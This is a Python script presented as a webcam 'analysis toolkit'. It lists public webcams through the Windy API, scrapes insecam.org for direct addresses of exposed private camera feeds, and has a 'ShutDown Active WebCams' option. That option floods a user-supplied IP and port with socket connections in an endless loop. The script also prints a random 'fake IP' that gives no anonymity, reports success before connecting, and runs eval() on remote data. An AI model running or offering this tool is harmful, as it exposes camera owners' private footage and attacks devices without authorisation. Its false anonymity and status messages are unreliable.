# this is a webcam analysis toolkit that's perform webcam tracking i.e location, id, and its status
# this is is only built for educational purposes only... don't misuse this tool!!! 
# start
import time
import os
import socket
import requests
import cfonts
from requests.structures import CaseInsensitiveDict
from colorama import Fore, Back
import re
import random

headers = CaseInsensitiveDict()
headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
headers["Cache-Control"] = "max-age=0"
headers["Connection"] = "keep-alive"
headers["Host"] = "www.insecam.org"
headers["Upgrade-Insecure-Requests"] = "1"
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"

# ...
if os.name == 'posix':
   os.system('clear')
elif os.name == 'nt':
   os.system('cls')
else:
   print(Fore.RED+'[*] Unable To Clear Screen Output...'+Fore.WHITE)
#


#...
ip = ('.'.join(str(random.randint(0, 255)) for _ in range(4)))

# ...
app_title = cfonts.render('Gospel Coding', colors=['red', 'blue'], align='center')
print(app_title)
print(Fore.YELLOW+'WebCam Analysis Toolkit'.center(66)+Fore.WHITE)
print(Fore.BLUE+'V4.3.1'.center(66)+Fore.WHITE)
print(Fore.YELLOW+f'[ This Is Your Fake IP - {ip} ]'.center(66)+Fore.WHITE)
#

# ...
print(Fore.GREEN+'[01] Fetch Active WebCams In A Country'+Fore.WHITE, '\n')
print(Fore.GREEN+'\n[02] Get Latest WebCams Footages In A Country [image video]'+Fore.WHITE, '\n')
print(Fore.GREEN+'\n[03] ShutDown Active WebCams'+Fore.WHITE, '\n')
#

# ...
opt = int(input(Fore.BLUE+'[*] Option >> '+Fore.WHITE))
print('\n')
if opt == 1:
   print(Fore.YELLOW+'[*] Enter Your API Key To Continue... If Not Available Then Request For An API Key At https://api.windy.com'+Fore.WHITE, '\n')
   apikey = input(Fore.BLUE+'Enter API Key To Continue >> '+Fore.WHITE)
   print('\n')
   print(Fore.BLUE+'[*] Validating API Key... Please Wait.'+Fore.WHITE, '\n')
   req = requests.get('https://api.windy.com/api/webcams/v2/list/country=GB/orderby=popularity/limit=20?key={}'.format(apikey))
   if req.text == 'Forbidden':
      print(Fore.RED+'\n[*] The API Key You Provided Is Incorrect... Check And Try Again!!!\n'+Fore.WHITE)
      exit(0)
   else:
        pass

   country = input(Fore.BLUE+'[*] Country [Alpha-2-Code] >>  '+Fore.WHITE).upper()
   category = input(Fore.BLUE+'\n[*] Category [beach airport city bay area building camping forest island marketplace mountain other landscape] >> '+Fore.WHITE)
   if len(country) == 2:
      pass
   else:
      print(Fore.RED+'\n[*] The Country Code Must Be An Alpha-2-Code e.g NG For Nigeria CA For Canada EU For Europe And So On...'+Fore.WHITE)
   print(Fore.YELLOW+'\n[*] Fetching Active WebCams At {}... '.format(country)+Fore.WHITE, '\n')
   fetch = requests.get('https://api.windy.com/api/webcams/v2/list/category={}/country={}/orderby=popularity/limit=20?key={}'.format(category, country, apikey))
   if fetch.text == '{"status":"OK","result":{"offset":0,"limit":20,"total":0,"webcams":[]}}':
      print(Fore.GREEN+'\n[*] No Active WebCams Available...'+Fore.WHITE)
      exit(0)
   else:
        pass
   response = eval(fetch.text)['result']['webcams']
   for data in response:
       print(Fore.BLUE+'[*] WebCam ID - ', data['id'], Fore.GREEN+'Status -', data['status'], Fore.YELLOW+'Location - ', data['title'], '\n')
elif opt == 2:
     print(Fore.YELLOW+'[*] Enter Your API Key To Continue... If Not Available Then Request For An API Key At https://api.windy.com'+Fore.WHITE, '\n')
     apikey = input(Fore.BLUE+'Enter API Key To Continue >> '+Fore.WHITE)
     print('\n')
     print(Fore.BLUE+'[*] Validating API Key... Please Wait.'+Fore.WHITE, '\n')
     req = requests.get('https://api.windy.com/api/webcams/v2/list/country=GB/orderby=popularity/limit=20?key={}'.format(apikey))
     if req.text == 'Forbidden':
        print(Fore.RED+'\n[*] The API Key You Provided Is Incorrect... Check And Try Again!!!\n'+Fore.WHITE)
        exit(0)
     else:
        pass

     country = input(Fore.BLUE+'[*] Country [Alpha-2-Code] >>  '+Fore.WHITE).upper()
     print(Fore.YELLOW+'\n[*] Fetching Latest WebCams Footages At {}... '.format(country)+Fore.WHITE, '\n')
     fetch = requests.get(f'http://www.insecam.org/en/bycountry/{country}', headers = headers)
     srch = re.findall('http://\d+.\d+.\d+.\d+:\d+/[a-z]+/[a-z]+.[a-z]+', fetch.text)
     for footages in srch:
         print(Fore.RED+'[*] '+footages+Fore.WHITE, '\n')
     if len(srch) in [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:
        fetch = requests.get(
            f"http://www.insecam.org/en/bycountry/{country}/?page=2",
            headers=headers
        )
        srch = re.findall(r"http://\d+.\d+.\d+.\d+:\d+/[a-z]+/[a-z]+.[a-z]+", fetch.text)
        for footages in srch:
            print(Fore.RED+'[*] '+footages+Fore.WHITE, '\n')

     if len(srch) in [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:
        fetch = requests.get(
            f"http://www.insecam.org/en/bycountry/{country}/?page=3",
            headers=headers
        )
        srch = re.findall(r"http://\d+.\d+.\d+.\d+:\d+/[a-z]+/[a-z]+.[a-z]+", fetch.text)
        for footages in srch:
            print(Fore.RED+'[*] '+footages+Fore.WHITE, '\n')

elif opt == 3:
     print(Fore.YELLOW+'[*] Enter Your API Key To Continue... If Not Available Then Request For An API Key At https://api.windy.com'+Fore.WHITE, '\n')
     apikey = input(Fore.BLUE+'Enter API Key To Continue >> '+Fore.WHITE)
     print('\n')
     print(Fore.BLUE+'[*] Validating API Key... Please Wait.'+Fore.WHITE)
     req = requests.get(f'https://api.windy.com/api/webcams/v2/list/country=GB/orderby=popularity/limit=20?key={apikey}')
     if req.text == 'Forbidden':
        print(Fore.RED+'\n[*] The API Key You Provided Is Incorrect... Check And Try Again Later\n'+Fore.WHITE)
        exit(0)
     else:
        pass

     webcam_ip = input(Fore.BLUE+'\n[*] Enter WebCam I.P >> '+Fore.WHITE)
     print('\n')
     port = int(input(Fore.YELLOW+'[*] Port Address >> '+Fore.WHITE))
     print('\n')
     def shutdown_webcam():
         print(Fore.RED+f'[*] Connected To {webcam_ip}:{port} Successfully'+Fore.WHITE)
         time.sleep(2)
         print(Fore.RED+'\n[*] Attack Started Successfully...'+Fore.WHITE, '\n')
         while True:
              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              s.connect((webcam_ip, port))
              s.sendto(('GET /'+ webcam_ip + 'HTTP/1.0\r\n').encode('ascii'), (webcam_ip, port))
              s.sendto(('Host /'+ ip + 'HTTP/1.0\r\n').encode('ascii'), (webcam_ip, port))
     shutdown_webcam()
